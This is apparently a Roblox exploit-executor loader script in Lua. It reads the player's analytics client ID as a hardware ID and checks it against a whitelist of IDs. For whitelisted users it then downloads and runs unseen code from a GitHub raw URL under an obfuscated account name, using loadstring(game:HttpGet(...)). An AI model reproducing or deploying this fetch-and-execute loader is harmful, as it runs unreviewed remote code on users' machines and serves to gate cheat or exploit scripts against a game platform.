local HttpService = game:GetService("HttpService")

-- Your allowed HWIDs (in real use you’d probably fetch this from a server)
local allowedHWIDs = {
    ["d81e-2ace-dca3-f780"] = true,
    ["5a2cdbf2-c3b3-4ef4-bf4a-5c133637384f"] = true,
    ["80696043-9102-43d6-a97b-79b140c1078f"] = true,
    ["2a956cc1-d557-4719-af5a-40ac4aefb4f4"] = true,
    ["27dacfcb-130e-4a37-90bb-c58669095185"] = true,
    ["36b4cd9e-018e-4f9e-9b1a-80990921895e"] = true,
    ["635e53d5-01b1-4914-b70d-dce92c04e88e"] = true,
    ["SOME_HWID_2"] = true,
    ["SOME_HWID_2"] = true,
    -- add more here
}

-- Safely get the HWID
local function getHWID()
    local success, clientId = pcall(function()
        return game:GetService("RbxAnalyticsService"):GetClientId()
    end)
    if success and clientId then
        return clientId
    else
        return nil
    end
end

local hwid = getHWID()
if not hwid then
    warn("Failed to retrieve HWID.")
    return -- stop execution
end

print("Your HWID: " .. hwid)
pcall(setclipboard, hwid) -- try to copy, don’t error if unavailable

-- Whitelist check
if not allowedHWIDs[hwid] then
    warn("HWID not allowed: " .. hwid)
    return -- abort/script disabled
end

-- If allowed, proceed to load the remote script
loadstring(game:HttpGet("https://raw.githubusercontent.com/lllllllllllllllllllllIl/xpxp/refs/heads/main/Wrk"))()
